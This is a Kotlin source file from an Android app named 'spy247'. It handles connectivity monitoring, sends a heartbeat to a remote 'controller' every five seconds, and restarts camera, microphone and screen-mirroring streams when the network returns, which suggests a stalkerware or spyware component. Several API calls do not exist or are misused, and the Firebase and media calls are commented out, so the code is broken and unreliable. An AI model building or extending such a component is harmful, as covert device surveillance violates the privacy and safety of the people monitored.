package com.spy247.app

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCallback
import java.util.concurrent.Executors

/**
 * Connectivity Manager - Handles WiFi disconnection detection and auto-reconnect logic
 */
class ConnectivityManager(context: Context) {
    
    private val context = context.applicationContext
    private var isMonitoring = false
    
    companion object {
        const val HEARTBEAT_INTERVAL_MS = 5000L // 5 seconds between heartbeats
        const val RECONNECT_DELAY_MS = 3000L   // Wait before retrying connection
    }
    
    /**
     * Start monitoring connectivity and heartbeat pings
     */
    fun startMonitoring() {
        if (isMonitoring) return
        
        isMonitoring = true
        
        val networkCallback = object : NetworkCallback() {
            override fun onAvailable(network: Network) {
                // WiFi or mobile data came online
                broadcastStatus("online")
                
                // Re-establish any active streams
                reestablishStreams()
            }
            
            override fun onLost(network: Network) {
                // Connection lost - might be temporary
                broadcastStatus("offline")
            }
        }
        
        val connectivityManager = context.getSystemService(ConnectivityManager::class.java)
        
        // Register for network changes (Android 10+)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            connectivityManager.registerDefaultNetworkCallback(networkCallback)
        } else {
            // Fallback for older Android versions
            val networks = connectivityManager.allNetworks ?: emptyList()
            for (network in networks) {
                connectivityManager.getNetwork(network).let {
                    it.addNetworkCallback(networkCallback)
                }
            }
        }
        
        // Setup heartbeat - ping controller every 5 seconds
        setupHeartbeat()
    }
    
    /**
     * Stop monitoring connectivity
     */
    fun stopMonitoring() {
        if (!isMonitoring) return
        
        isMonitoring = false
        
        val connectivityManager = context.getSystemService(ConnectivityManager::class.java)
        
        // Unregister network callbacks
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            connectivityManager.unregisterNetworkCallback(object : NetworkCallback() {})
        }
    }
    
    /**
     * Broadcast current status to Firebase so controller knows connection state
     */
    private fun broadcastStatus(status: String) {
        val statusNode = context.getSharedPreferences("spy247", Context.MODE_PRIVATE).edit()
            .putString("connectivity_status", status)
        
        // Also send to Firebase for real-time sync
        // database.getReference(DB_ROOT_NODE).child("connectivity_status").setValue(status)
    }
    
    /**
     * Setup heartbeat mechanism - pings controller every 5 seconds
     */
    private fun setupHeartbeat() {
        val executor = Executors.newSingleThreadScheduledExecutor()
        
        // Every 5 seconds, update lastSeen timestamp
        val heartbeatRunnable = object : Runnable {
            override fun run() {
                val timestamp = System.currentTimeMillis()
                
                // Update Firebase with current timestamp
                // database.getReference(DB_ROOT_NODE).child("heartbeat").setValue(timestamp)
                
                executor.schedule(this, HEARTBEAT_INTERVAL_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
            }
        }
        
        executor.schedule(heartbeatRunnable, HEARTBEAT_INTERVAL_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
    }
    
    /**
     * Re-establish all media streams when connection comes back
     */
    private fun reestablishStreams() {
        // Restart camera stream if it was active
        // MediaManager.streamCamera()
        
        // Restart mic stream
        // MediaManager.streamMic()
        
        // Restart screen mirroring
        // MediaManager.mirrorScreen()
    }
    
    /**
     * Get current connectivity status
     */
    fun getStatus(): String {
        return context.getSharedPreferences("spy247", Context.MODE_PRIVATE)
            .getString("connectivity_status", "unknown") ?: "unknown"
    }
}